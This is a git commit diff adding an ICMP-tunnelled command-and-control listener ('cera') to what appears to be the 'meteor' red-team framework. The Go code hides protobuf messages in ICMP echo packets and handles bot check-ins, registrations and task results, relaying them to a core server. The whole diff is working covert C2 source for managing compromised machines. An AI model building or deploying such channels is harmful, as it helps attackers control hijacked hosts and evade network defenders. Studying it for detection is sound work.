1645e7b5811d7094623696f3287855b5c71d2e0b
degenerat3 <james.maskelony@gmail.com>
2020-10-12 21:22:23 -0400

    add cera server func

--- meteor/listeners/cera/cera.go
+++ meteor/listeners/cera/cera.go
@@ -1,5 +1,213 @@
 package main
 
+import (
+	"fmt"
+	lUtils "github.com/degenerat3/meteor/meteor/listeners/utils"
+	"github.com/degenerat3/meteor/meteor/pbuf"
+	"github.com/golang/protobuf/proto"
+	"golang.org/x/net/icmp"
+	"log"
+	"net"
+	"os"
+)
+
+type session struct {
+	sid        int32        // session ID
+	peer       net.Addr     // net address of the session peer
+	rData      []byte       // data recieved
+	tData      [][]byte     // data to be transferred, split into manageable chunks
+	cachedPyld []byte       // most recent payload
+	cachedChk  []byte       // most recent checksum
+	cachedFlg  mcs.CTP_Flag // most recent flag
+}
+
+var (
+	// CORESERVER is the IP:Port of the Meteor core
+	CORESERVER = os.Getenv("CORE_SERVER") // format: 9.9.9.9:9999
+
+	// LOGPATH is the output path (including fname) for the listener logs
+	LOGPATH = os.Getenv("LOGPATH")
+
+	// write info logs to this
+	infoLog *log.Logger
+
+	// write warning logs to this
+	warnLog *log.Logger
+
+	// write all errors to this
+	errLog *log.Logger
+
+	// holds all the active sessions
+	sessions []session
+
+	//max size of filedata chunks
+	splitSize = 1024
+)
+
 func main() {
+	infoLog, warnLog, errLog = lUtils.InitLogger(LOGPATH)
+	conn := getListener("0.0.0.0")
+	for {
+		respProto, peer := readFromListener(conn)
+		go handleCTPPayload(respProto, peer, conn)
+	}
+}
+
+func handleCTPPayload(respProto *mcs.CTP, peer net.Addr, conn *icmp.PacketConn) {
+	switch respFlag := respProto.GetTypeFlag(); respFlag {
+	case 0: // session init
+		ses := genSession(respProto, peer)
+		writeToListener(conn, peer, ses.sid, []byte("sidack"), []byte(""), 1)
+		updateSessionCache(ses.sid, []byte("sidack"), []byte(""), 1)
+		return
+	case 1: // ack
+		switch rcvdPyld := string(respProto.GetPayload()); rcvdPyld {
+		case "finAck": // client sent/rec'd all data, done
+			sid := respProto.GetSessionId()
+			delSession(sid)
+			return
+		case "mAck":
+			sid := respProto.GetSessionId()
+			peer, nextChunk, chksm, flg := genNextData(sid)
+			updateSessionCache(sid, nextChunk, chksm, flg)
+			writeToListener(conn, peer, sid, nextChunk, chksm, flg)
+			return
+		}
+	case 2: // data
+		sid := respProto.GetSessionId()
+		match := processMCSData(sid, respProto.GetPayload(), respProto.GetChecksum())
+		if match == false { // if our checksum didn't pass, requeset a retransmission
+			writeToListener(conn, peer, sid, []byte(""), []byte(""), 4)
+			updateSessionCache(sid, []byte(""), []byte(""), 4)
+		}
+		writeToListener(conn, peer, sid, []byte("mAck"), []byte(""), 1) // if checksum passed, ack it
+		updateSessionCache(sid, []byte("mAck"), []byte(""), 1)
+		return
+	case 3: // fin
+		sid := respProto.GetSessionId()
+		ses := getSession(sid)
+		mcsPyld := ses.rData
+		retData := handleMCSPayload(mcsPyld)
+		splitPayload(retData, ses)
+		peer, nextChunk, chksm, flg := genNextData(sid)
+		updateSessionCache(sid, nextChunk, chksm, flg)
+		writeToListener(conn, peer, sid, nextChunk, chksm, flg)
+		return
+	case 4: // retrans
+		sid := respProto.GetSessionId()
+		ses := getSession(sid)
+		writeToListener(conn, ses.peer, sid, ses.cachedPyld, ses.cachedChk, ses.cachedFlg)
+		return
+	}
 	return
+}
+
+// handlePayload will take the fully transferred byte slice and extract the appropriate data for sending to core
+func handleMCSPayload(data []byte) []byte {
+	comms := &mcs.MCS{}
+	err := proto.Unmarshal(data, comms)
+	if err != nil {
+		errLog.Println("Error unmarshalling client data: " + err.Error())
+		return []byte("")
+	}
+	md := comms.GetMode()
+	var retData []byte
+	if md == "checkin" {
+		infoLog.Println("Handling checkin from bot: " + comms.GetUuid())
+		retData = lUtils.HandleCheckin(comms.GetUuid(), CORESERVER)
+	} else if md == "register" {
+		infoLog.Println("Handling register from bot: " + comms.GetUuid())
+		retData = lUtils.HandleReg(comms.GetUuid(), comms.GetInterval(), comms.GetDelta(), comms.GetHostname(), CORESERVER)
+	} else if md == "addResult" {
+		infoLog.Println("Handling addResult for action: " + comms.GetUuid())
+		retData = lUtils.HandleAddRes(comms.GetUuid(), comms.GetResult(), CORESERVER)
+	} else {
+		warnLog.Println("Recieved an unknown mode")
+		retData = []byte("")
+	}
+	fmt.Println(retData)
+	// send that data to the client
+	return retData
+}
+
+func genSession(respProto *mcs.CTP, peer net.Addr) session {
+	var ses session
+	ses.sid = respProto.GetSessionId()
+	ses.peer = peer
+	sessions = append(sessions, ses)
+	return ses
+}
+
+func delSession(sid int32) {
+	for i, ses := range sessions {
+		if sid == ses.sid {
+			sessions[i] = sessions[len(sessions)-1] // replace session with last index
+			sessions = sessions[:len(sessions)-1]   // trim last index
+		}
+	}
+}
+
+func getSession(sid int32) *session {
+	for i, ses := range sessions {
+		if sid == ses.sid {
+			return &sessions[i]
+		}
+	}
+	return nil
+}
+
+func updateSessionCache(sid int32, pyld []byte, chk []byte, flg mcs.CTP_Flag) {
+	ses := getSession(sid)
+	ses.cachedPyld = pyld
+	ses.cachedChk = chk
+	ses.cachedFlg = flg
+	return
+}
+
+func splitPayload(pyld []byte, ses *session) {
+	var chunks [][]byte
+	for {
+		if len(pyld) > splitSize {
+			chnk := pyld[0:splitSize]
+			chunks = append(chunks, chnk)
+			pyld = pyld[splitSize:]
+		} else {
+			chunks = append(chunks, pyld)
+			break
+		}
+	}
+	ses.tData = chunks
+	return
+}
+
+func getNextChunk(ses *session) []byte {
+	if len(ses.tData) > 0 {
+		next := ses.tData[0]
+		if len(ses.tData) >= 1 {
+			ses.tData = ses.tData[1:]
+		}
+		return next
+	}
+	return []byte("")
+
+}
+
+func genNextData(sid int32) (net.Addr, []byte, []byte, mcs.CTP_Flag) {
+	ses := getSession(sid)
+	pyld := getNextChunk(ses)
+	if len(pyld) == 0 {
+		return ses.peer, []byte(""), []byte(""), 3 // send a FIN if we're done
+	}
+	chk := calcChecksum(pyld)
+	return ses.peer, pyld, chk, 2 // send next chunk as DATA
+}
+
+func processMCSData(sid int32, pyld []byte, chk []byte) bool {
+	myChk := calcChecksum(pyld)
+	if match := compareChks(myChk, chk); match == false {
+		return false
+	}
+	ses := getSession(sid)
+	ses.rData = append(ses.rData, pyld...)
+	return true
 }
---
+++ meteor/listeners/cera/utils.go
@@ -0,0 +1,149 @@
+package main
+
+import (
+	"crypto/sha1"
+	"encoding/base64"
+	"github.com/degenerat3/meteor/meteor/pbuf"
+	"github.com/golang/protobuf/proto"
+	"golang.org/x/net/icmp"
+	"golang.org/x/net/ipv4"
+	"log"
+	"net"
+	"time"
+)
+
+// icmpConst is usually one, used for protocol marshalling (ipv6 support has a diff one)
+const icmpConst int = 1
+
+// timeout is how long the conn read will wait for before timing
+const timeout int = 10
+
+// readSize is the amount to read from the listener (always send less than this)
+const readSize int = 1600
+
+// calculate the sha1 sum of the data and use (almost) the last 8 chars as the checksum
+func calcChecksum(data []byte) []byte {
+	hasher := sha1.New()
+	hasher.Write(data)
+	sha := base64.URLEncoding.EncodeToString(hasher.Sum(nil))
+	chk := sha[len(sha)-9 : len(sha)-1]
+	return []byte(chk)
+}
+
+// generate an icmp listener on the specified IP (usually 0.0.0.0)
+func getListener(ip string) *icmp.PacketConn {
+	conn, err := icmp.ListenPacket("ip4:icmp", ip)
+	if err != nil {
+		log.Fatal(err)
+	}
+	return conn
+}
+
+// take in the required fields for an `IFTPP` message and proto-fy the data
+func buildProto(sid int32, payld []byte, chksum []byte, typ mcs.CTP_Flag) []byte {
+	testPro := &mcs.CTP{
+		SessionId: sid,
+		Payload:   payld,
+		Checksum:  chksum,
+		TypeFlag:  typ,
+	}
+
+	data, err := proto.Marshal(testPro)
+	if err != nil {
+		log.Fatal("marshaling error: ", err)
+	}
+
+	return data
+}
+
+// marshal the data into an `IFTPP` msg
+func decodeProto(data []byte) *mcs.CTP {
+	iftppMesage := &mcs.CTP{}
+	if err := proto.Unmarshal(data, iftppMesage); err != nil {
+		log.Fatalln("Failed to unmarshal IFTPP:", err)
+	}
+	return iftppMesage
+}
+
+// take a byte slice payload an turn it into an ICMP message packet
+func buildICMP(payload []byte) []byte {
+	m := icmp.Message{
+		Type: ipv4.ICMPTypeEcho, Code: 0,
+		Body: &icmp.RawBody{
+			Data: payload,
+		},
+	}
+	b, err := m.Marshal(nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	return b
+}
+
+// disassemble ICMP message packet and extract body
+func disasICMP(msg []byte, n int) []byte {
+	parsed, err := icmp.ParseMessage(icmpConst, msg[:n])
+	if err != nil {
+		log.Fatal(err)
+	}
+	bod, err := parsed.Body.Marshal(icmpConst)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	return bod
+}
+
+// take the required fields for an `IFTPP` message and put them into an ICMP packet
+func buildPacket(sid int32, payld []byte, chksum []byte, typ mcs.CTP_Flag) []byte {
+	buf := buildProto(sid, payld, chksum, typ)
+	packet := buildICMP(buf)
+	return packet
+}
+
+// disassemble ICMP packet, return an `IFTPP` message so we can use field references
+func disasPacket(msg []byte, n int) *mcs.CTP {
+	packetBody := disasICMP(msg, n)
+	protoMsg := decodeProto(packetBody)
+	return protoMsg
+}
+
+// read a packet from the listener, extract body from the ICMP, unmarshall the body into an `IFTPP` message
+func readFromListener(conn *icmp.PacketConn) (*mcs.CTP, net.Addr) {
+	msg := make([]byte, readSize)
+	err := conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	if err != nil {
+		log.Fatal(err)
+	}
+	n, peer, err := conn.ReadFrom(msg)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	protoMsg := disasPacket(msg, n)
+
+	return protoMsg, peer
+}
+
+// marshal provided fields into an `IFTPP` message, put that into an ICMP packet body, write the packet to the conn
+func writeToListener(conn *icmp.PacketConn, dst net.Addr, sid int32, payld []byte, chksum []byte, typ mcs.CTP_Flag) {
+	packet := buildPacket(sid, payld, chksum, typ)
+	_, err := conn.WriteTo(packet, dst)
+	if err != nil {
+		log.Fatal(err)
+	}
+	return
+}
+
+func compareChks(myChk []byte, chk []byte) bool {
+	if len(myChk) != len(chk) {
+		return false
+	}
+
+	for i, j := range myChk {
+		if j != chk[i] {
+			return false
+		}
+	}
+	return true
+}
